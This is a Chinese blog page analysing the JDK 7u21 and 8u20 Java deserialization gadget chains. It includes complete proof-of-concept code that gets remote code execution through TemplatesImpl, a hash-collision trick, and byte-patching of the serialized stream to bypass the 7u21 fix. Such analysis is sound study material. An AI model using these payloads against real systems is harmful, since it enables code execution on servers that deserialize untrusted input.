<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>jdk7u21&amp; 8u20 深度分析 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="前言：最近缺少sink点，看看前辈们是怎么利用原生链的 然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度 jdk">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="jdk7u21&amp; 8u20 深度分析" />
<meta property="og:description" content="前言：最近缺少sink点，看看前辈们是怎么利用原生链的 然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度 jdk" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-05-10T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-07-02T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="jdk7u21&amp; 8u20 深度分析"/>
<meta name="twitter:description" content="前言：最近缺少sink点，看看前辈们是怎么利用原生链的 然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度 jdk"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "jdk7u21\u0026 8u20 深度分析",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "jdk7u21\u0026 8u20 深度分析",
  "name": "jdk7u21\u0026 8u20 深度分析",
  "description": "前言：最近缺少sink点，看看前辈们是怎么利用原生链的 然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度 jdk",
  "keywords": [
    
  ],
  "articleBody": "前言：最近缺少sink点，看看前辈们是怎么利用原生链的\n然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度\njdk8u20主要是根据参考种跳跳糖那篇文章，学习的。有点难度的。思路到不难，就是最后那个报错的完全理解什么原因以及怎么处理！感觉参考文章那个点不是很清楚，于是根据自己的理解又去琢磨琢磨了那个点\njdk7u21 简短概述下吧，利用AnnotationInvocationHandler#invoke方法中动态代理 调用的方法为equals时对应if选项里代码，其会通过(for循环反射调用)去调用type属性的所有方法（这里也就设置type为Templates.class，然后调用的对象为equals(obj)的参数，所以这里obj是TemplatesImpl即可进行利用）\n然后还有个难点是hash的判断，利用map的equals，都需要构造一个hash相等的东西（这里7u21作者的设计还挺有意思的）那就一起简单看看吧\n调用链\nLinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() 这里其实到Proxy(Templates).equals()前都是为了进入equals这步if，前面都是为了hash相等的构造（也就是核心sink利用步骤只有后面这段）\npoc poc是直接用的ysoserial的\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.Jdk7u21; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk7u21_poc { public static void main(String[] args) throws Exception { Object templates = Gadgets.createTemplatesImpl(\"calc\"); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \"_auxClasses\", (Object)null); Reflections.setFieldValue(templates, \"_class\", (Object)null); map.put(zeroHashCodeStr, templates); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } hash 链子整体没啥讲的，很简单。主要是hash那\n主要要满足两次进入put时，hash要一样，且第一次设置的key(就是第二次的k)得是TemplatesImpl（因为这个是作为最后invoke的object进行调用的）也就是说proxyput调用前，得有一个存储值key得是TemplatesImpl且hash要和proxy计算出的hash相同\npublic class HashSet\u003cE\u003e{ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { for (int i=0; i\u003csize; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } 然后这里TemplatesImpl的hashcode()调用是直接调用Object的hashcode()\n而proxy的hashcode()这里则是有对应的处理方式（这里其实可以控制返回0，但是TemplatesImpl的hashcode()不可能为0，所以不能这样构造\nprivate int hashCodeImpl() { int var1 = 0; Map.Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Map.Entry)var2.next(); } return var1; } this.memberValues可以初始化设置，可以看到返回的是var1\nvar1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) private static int memberValueHashCode(Object var0) { Class var1 = var0.getClass(); if (!var1.isArray()) { return var0.hashCode(); 然后7u21的作者是爆破了一个((String)var3.getKey()).hashCode()的值为**0**的数(\"f5a5a608\")\n然后再让var3.getValue()为第一次存储的TemplatesImpl为同一个对象，即可实现和第一次的hash值相等\n巧的点就在这hhh，我第一反义肯定想不到一个有值的String.hashcode()的值会为0！！\n[*] String hashcode \u0026 整形溢出 然后就好奇呀，就去看代码了，发现是溢出导致的负数从而导致可以得到0这个值hhh，挺有意思的，第一次直观感受到整形溢出的利用\n然后写了个小demo，感觉挺有意思的\npublic class hashtest { public static void main(String[] args) throws Exception { System.out.println(Integer.MAX_VALUE); // 输出 2147483647 System.out.println(Integer.MIN_VALUE); System.out.println(2147483647*100); System.out.println(2147483647*2); System.out.println(2147483647+1); System.out.println(-2147483648-1); System.out.println(-2147483648*3); System.out.println(2147483647*3); System.out.println(\"\".hashCode()); } } 输出 2147483647 -2147483648 -100 -2 -2147483648 2147483647 -2147483648 2147483645 0 然后对int的值域的理解，其实类似一个环形（最小值连接着最大值，min-1=max，max+1=min）\n这里简单解释下-2147483648*2 = 0 ，2147483647*2 = -2\n这里其实就是二进制下右移一步\n-2147483648是10000000 00000000 00000000 00000000右移后直接00000000 00000000 00000000 00000000也就为0了\n2147483647是01111111 11111111 11111111 11111111右移后11111111 11111111 11111111 11111110，这里开头是1要采用补码机制，即为-号，然后取反再+1\n取反00000000 00000000 00000000 00000001+1得00000000 00000000 00000000 00000010然后符号\n所以为-2hh，都快忘了hh 很明白了吧\n[*] 值2 当然这里值肯定不止f5a5a608一个，但是呢我可能想不到溢出但是我肯定会想到\"\"空值\n我们看到String的hash默认是为0的\n再看String的hashCode()代码，是不是只有不进入这个if，即可得到hash为0的字符串了呢\n也就是让length\u003c=0即可，即\"\".hashCode()，验证可行hh\n然后其实这里equals的触发，CC7的map我觉得也完全没问题，感兴趣可以看看我CC7的几种绕过hash相等的问题\nput点 还有一个关于put顺序的poc设计吧，也是类似CC链的。\nmap这个值存放到AnnotationInvocationHandler.this.memberValues用于hash的运算\n然后这里map没有直接存TemplatesImpl对象，因为下方LinkedHashSet#add会触发map#put-\u003ehash的检测——\u003e触发equals调用-\u003e触发sink报错中断\n所以这里等LinkedHashSet#add完，再put覆盖成对应的TemplatesImpl对象，其他应该没啥说的了这条链子\n7u21的修复 对我们type进行了类型限制，导致我们将type设置成Templates.class时会throw错误中断我们的反序列化，\njdk8u20 这里主要依靠的是@1nhann师傅那篇文章，不轻松捏\n针对7u21的绕过，主要利用两个特性\n双层try/catch TC_REFERENCE 双层try/catch 直接写看个demo吧，这里我们会发现里层try会throw错误，但是这个时候并不会直接中断程序，相当于里层try/catch都属于外层try的代码，所以这时应该跳转到外层的catch，而外层catch没有throw时后面的代码依然可以正常运行\n当然这里外层catch是throw的话，这个会返回bitch2\n还有一点外层catch的捕获类型要包含内层的throw，如果外层是IOException，内层是Exception，这时就会捕获不到，然后报错终端\npublic class error { public static void main(String[] args) throws Exception { try { try { int i = 1/0; }catch (Exception e){ throw new Exception(\"bitch\"); } }catch (Exception e){ // }catch (IOException e){ // throw new Exception(\"bitch2\"); ; } System.out.println(\"fuck\"); } } 而AnnotationInvocationHandler#readObject中是先就执行了s.defaultReadObject();再对type进行的判断\n这样也就是，进行type判断后的代码，我其实并不需要（gadget不用后面的调用），我只需要AnnotationInvocationHandler对象而已，所以这里靠双层try/catch能让AnnotationInvocationHandler还原对象即可，type后面的代码执行不了也无所谓\n所以gadget中如果有代码能满足这个一个例子，是不是就能让AnnotationInvocationHandler#readObject不中断程序了呢\n{ try{ os.readObject(); //这个进行AnnotationInvocationHandler#readObject } catch (Exception e){ ; //然后会跳转到这行来，只要不是什么强制退出的代码是不是就能用了呢 } } 然后还有一点要考虑，就是段代码要能被我们gadget调用且能控制os值为我们AnnotationInvocationHandler序列化数据\n这里java.beans.beancontext.BeanContextSupport 就刚好满足我们的条件，这个类的 readObject() ，调用了 readChildren(ois);下图其代码中可以看到catch是满足条件的\nprivate synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable \u003e 0 \u0026\u0026 this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } TC_REFERENCE 这个简单说就是，java序列化/反序列化对每个对象产生时都设置了一个Handler值(类似索引)，而你第二次调用同一个对象时，java会直接通过这个Handler值找到第一次生成的对象进行调用\n还是通过demo说下吧（这个特性绕过fastjson原生链那个是同一个）懒，demo也是直接copy的，别喷\nimport ysoserial.Serializer; import java.io.File; import java.io.FileOutputStream; public class Test { public static void main(String[] args) throws Exception{ Fuck f = new Fuck(); Object[] l = {f,f}; byte[] ser = Serializer.serialize(l); writeFile(ser,\"1.txt\"); } public static void writeFile(byte[] content,String path) throws Exception{ File file = new File(path); FileOutputStream f = new FileOutputStream(file); f.write(content); f.close(); } } 就这里不是有2个f么，都调用的同一个对象，这里序列化时，只会给第一个f完整的序列化，而第二个f则存储第一个f的Handler，而反序列化时，也是先反序列化第一个f，到第二个f还原对象时，直接把第一个f的对象给他\n关于Handler的一个小知识，序列化数据里面 第一个Handler值都是 @Handler - 8257536 (0x7E0000)，然后每新产生一个Handler，值+1，第二个Handler就为8257537\n利用思路 然后说了这么多到底怎么利用呢？\n还记得7u21我们用的LinkedHashSet传了一个值，后面hash碰撞\n我们让BeanContextSupport包裹AnnotationInvocationHandler然后放在第一位//用于还原AnnotationInvocationHandler对象 TemplatesImpl放第二位，和7u21一样用于hash的碰撞 Proxy放第三位，其中代理类和我们BeanContextSupport包裹的是同一个对象就行了 这样会先反序列化BeanContextSupport对象，就会把AnnotationInvocationHandler还原了。然后proxy利用时直接通过Handler调用还原了的AnnotationInvocationHandler对象（后面就和7u21一样了\npoc 报错 前言：跳跳糖那篇文章很好，但是关于最后那个报错问题我觉得光看那篇文章肯定是搞不明白的以及为什么删那两个数据，为什么不能添加呢？为什么删除了数据会不出乱子而可以正常利用呢？其实都没交代（至少在我的视角下是这样的，也可能是我菜!^!），然后笔者下面记录的光看肯定也是理解不了，要自己找到对应点调试和对应序列化数据才能体会其中的真意\n直接copy的poc，然后也很好理解吧，但是又产生了一个新的报错！！！（为了搞明白这个报错也是花费了一些时间）\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.Gadgets; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class Poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\"calc.exe\"); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,new HashMap\u003c\u003e()); Reflections.setFieldValue(ih,\"type\", Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\"children\",tmpMap); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\"f5a5a608\",templates); Reflections.setFieldValue(ih,\"memberValues\",hm); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } 然后运行会产生一个因为readInt()的报错，而这个报错归功于AnnotationInvocationHandler\nException in thread \"main\" java.io.EOFException at java.io.DataInputStream.readInt(DataInputStream.java:392) at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823) 一直调试跟踪到readBlockHeader()这里return -1;导致的in.read()为-1 ，然后进入throw\n跟踪发现你的类重写readObject然后调用defaultReadObject()，反序列化就会进入下方代码，而defaultDataEnd这个值则跟该类有没有writeObject()有关，没有的话这里就会给defaultDataEnd = true，然后这就是导致上方报错的根本原因吗？？？No\n其实这只是其中一个原因（或者说不是根本原因），如果BeanContextSupport存一个对象，就因为这个对象的类没有writeObject()就报错，是不是有点太蠢了呀。于是写了个demo\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import java.beans.beancontext.BeanContextSupport; import java.util.HashMap; import java.util.LinkedHashSet; public class serSupport { public static void main(String[] args) throws Exception { Test2 test = new Test2(); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(test,null); Reflections.setFieldValue(b,\"children\",tmpMap); String test2=\"test2\"; TemplatesImpl templates = new TemplatesImpl(); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(test2); set.add(templates); byte[] ser = Serializer.serialize(set); ReadWrite.writeFile(ser,\"serobj.txt\"); Deserializer.deserialize(ser); } } Test2\nimport ysoserial.Deserializer; import ysoserial.payloads.util.ReadWrite; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Test2 implements Serializable { public static void main(String[] args) throws Exception{ byte[] bytes = ReadWrite.readFile(\"ser+.txt\"); Deserializer.deserialize(bytes); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); } } 然后你会发现并没有报错，而且defaultDataEnd = true也赋值了的。先看看序列化数据吧，用zkar看的\n我先解释下这段数据位于啥地方，最外层是java.util.LinkedHashSet的[]ClassData，就是记录LinkedHashSet中每个属性对应的值，然后为啥单独拿这个地方来说呢，看3那个位置，这个对我们来说很重要，因为这里是报错产生的位置。\n然后没有看过序列化数据的师傅建议跟着这个思维导图看，还是挺建议看的，把每个值的注释含义以及完整看一个序列化数据基本上就都能看懂了。\n然后简单提一点吧@ObjectAnnotation在数据里面当时没看懂的，后面看到下图这个才理解，可以理解为序列化数据吧（刚开始看的时候困惑了下，这里也是简单提一下\n然后你会看序列化数据后，你肯定还关心一个点@ClassDescFlags，可以看到Test2是没有SC_WRITE_METHOD这个值，那他为什么没有报错捏？\n@ClassName @Length - 5 - 0x00 05 @Value - Test2 - 0x54 65 73 74 32 @SerialVersionUID - 6232696428067116234 - 0x56 7e fc 61 0b c9 54 ca @Handler - 8257558 @ClassDescFlags - SC_SERIALIZABLE - 0x02 回到正题 我们在赋值true后往后跟踪，\n发现Test2反序列化完成后，会把defaultDataEnd = false重新覆盖掉的。（所以没有writeObject()不是罪魁祸首）\n然后再反序列化null，再到反序列化count = ois.readInt();（在结合上面序列化数据分析的）过程是这样。readInt()结束后，也就意味着BeanContextSupport反序列化结束了，然后到下一个对象了String test2的反序列化了（这里为什么说这个，对后面理解是有用的\ndebug表达式\nString.format(\"0x%02X\",(int)bin.in.in.buf[(int)bin.in.in.pos-1]) AnnotationInvocationHandler throw原因 那AnnotationInvocationHandler是什么原因呢自然是跟他readObject报错是有关系的。\n报错最后throw的是IOException的报错，然后下图2是捕获ClassNotFoundException报错的，所以这里不会进入catch，而是**走完finally（没能执行defaultDataEnd = false）继续跳转到上层throw**（这个步骤重复了几次），最后才被BeanContextSupport的catch捕获IOException\n于是这里又多了一层理解，及BeanContextSupportcatch能捕获的error要包含AnnotationInvocationHandler的throw才行而不只是满足双层try/catch结构\n原因小结 所以就是readObject报错导致退出了，从而没能让defaultDataEnd = false重新覆盖掉。导致readInt()报错。而添加SC_WRITE_METHOD只是我们利用的手段，不是原因\nbyte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); 所以这里我们把flags 0x02改成0x03（SC_WRITE_METHOD值是0x01所以这里+1），这里zkar看序列化数据报错了，可以用另一个工具替代下SerializationDumper\nC:\\TOOLS\\Java\\jdk-17\\bin\\java.exe -jar SerializationDumper-v1.14.jar -f C:\\Users\\26618\\Desktop\\Ljava\\jdk7u21-8u20\\ser+.txt 再次调试 从defaultDataEnd = true最后那个}那里开始吧，然后发现会一路throw到BeanContextSupportcatch continue;，直接退出了BeanContextSupport包裹类的反序列化，直接来到deserialize的ois.readInt();\n导致的问题 导致了个什么问题呢？\nmap的key是AnnotationInvocationHandler，而我们设置的map的value是null，这里AnnotationInvocationHandler反序列化完就中断了map的反序列化导致**null没有反序列化**，而程序直接来到了ois.readInt();，序列化数据in.in.pos却还在null值的位置，然后导致throw\n然而这个null并不影响我们利用，所以直接把这个值删掉就好\n这里再提一嘴null为什么删掉没事。以及为什么要删除\n还记得上面那个序列化数据图的分析么，下图这里是同一个位置含义差不多，这里调试对应的地方是TC_NULL,而int对应的是TC_BLOCKDATA，所以我们要让TC_BLOCKDATA提前，而为什么没影响呢，readInt()后其实就标志着BeanContextSupport反序列化的结束，然后紧接着要反序列化add的第二个对象了（下图是指向TemplatesImpl的Handler），所以这里不能添加值，只能删除值，因为添加值会对后面的反序列化照成影响，而删除TC_NULL能在前面完成闭环。\n最简洁poc 大功告成，我们没有直接给AnnotationInvocationHandler改写一个writeObject，所以可以直接一个文件就可以执行了\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ByteUtil; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk8u20_poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\"calc.exe\"); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, new HashMap\u003c\u003e()); Reflections.setFieldValue(ih,\"type\", Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\"children\",tmpMap); LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\"f5a5a608\",templates); Reflections.setFieldValue(ih,\"memberValues\",hm); byte[] ser = Serializer.serialize(set); byte[] nullReplace = new byte[]{0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71}; byte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); int j = ByteUtil.getSubarrayIndex(ser,nullReplace); ser = ByteUtil.deleteAt(ser,j); ReadWrite.writeFile(ser,\"ser+.txt\"); byte[] bytes = ReadWrite.readFile(\"ser+.txt\"); Deserializer.deserialize(bytes); } } 8u20修复 最后反射调用的方法只能是下面3个，导致不能调用sink点了\n后言：其实我记录的比较简单，关于导致的问题这里得经过调试以及查看序列化源码才能得出，我最开始是看参考文章以为就那么回事，然后我是打算补全那个int数据的，也就是填充数据，然后发生了报错，以及感觉到一些疑点吧。反正就始终说服不了自己，主要就是参考文章里面删除那两个数据，为什么呢，为什么呢？？我知道是对齐int，但是会不会对其他数据照成影响呢？然后就自己琢磨哇，也是搞得明明白白了很爽。然后调试找序列化数据里面对应的位置，可以通过前后pos的值去找\n参考\nhttps://tttang.com/archive/1729/#toc_\nhttps://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F\n",
  "wordCount" : "7181",
  "inLanguage": "zh",
  "datePublished": "2025-05-10T20:01:23+08:00",
  "dateModified": "2025-07-02T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
                    <span>搜索🔍︎</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      jdk7u21&amp; 8u20 深度分析
    </h1>
    <div class="post-meta"><span title='2025-05-10 20:01:23 +0800 CST'>2025-05-10</span>&nbsp;·&nbsp;15 分钟&nbsp;·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#jdk7u21" aria-label="jdk7u21">jdk7u21</a><ul>
                            
                    <li>
                        <a href="#poc" aria-label="poc">poc</a></li>
                    <li>
                        <a href="#hash" aria-label="hash">hash</a></li>
                    <li>
                        <a href="#-string-hashcode--%e6%95%b4%e5%bd%a2%e6%ba%a2%e5%87%ba" aria-label="[*] String hashcode &amp;amp; 整形溢出">[*] String hashcode &amp; 整形溢出</a></li>
                    <li>
                        <a href="#-%e5%80%bc2" aria-label="[*] 值2">[*] 值2</a></li>
                    <li>
                        <a href="#put%e7%82%b9" aria-label="put点">put点</a></li>
                    <li>
                        <a href="#7u21%e7%9a%84%e4%bf%ae%e5%a4%8d" aria-label="7u21的修复">7u21的修复</a></li></ul>
                    </li>
                    <li>
                        <a href="#jdk8u20" aria-label="jdk8u20">jdk8u20</a><ul>
                            
                    <li>
                        <a href="#%e5%8f%8c%e5%b1%82trycatch" aria-label="双层try/catch">双层try/catch</a></li>
                    <li>
                        <a href="#tc_reference" aria-label="TC_REFERENCE">TC_REFERENCE</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="利用思路">利用思路</a></li>
                    <li>
                        <a href="#poc-%e6%8a%a5%e9%94%99" aria-label="poc 报错">poc 报错</a><ul>
                            
                    <li>
                        <a href="#%e5%9b%9e%e5%88%b0%e6%ad%a3%e9%a2%98" aria-label="回到正题">回到正题</a></li>
                    <li>
                        <a href="#annotationinvocationhandler-throw%e5%8e%9f%e5%9b%a0" aria-label="AnnotationInvocationHandler throw原因">AnnotationInvocationHandler throw原因</a></li>
                    <li>
                        <a href="#%e5%8e%9f%e5%9b%a0%e5%b0%8f%e7%bb%93" aria-label="原因小结">原因小结</a></li>
                    <li>
                        <a href="#%e5%86%8d%e6%ac%a1%e8%b0%83%e8%af%95" aria-label="再次调试">再次调试</a></li>
                    <li>
                        <a href="#%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98" aria-label="导致的问题">导致的问题</a></li>
                    <li>
                        <a href="#%e6%9c%80%e7%ae%80%e6%b4%81poc" aria-label="最简洁poc">最简洁poc</a></li></ul>
                    </li>
                    <li>
                        <a href="#8u20%e4%bf%ae%e5%a4%8d" aria-label="8u20修复">8u20修复</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
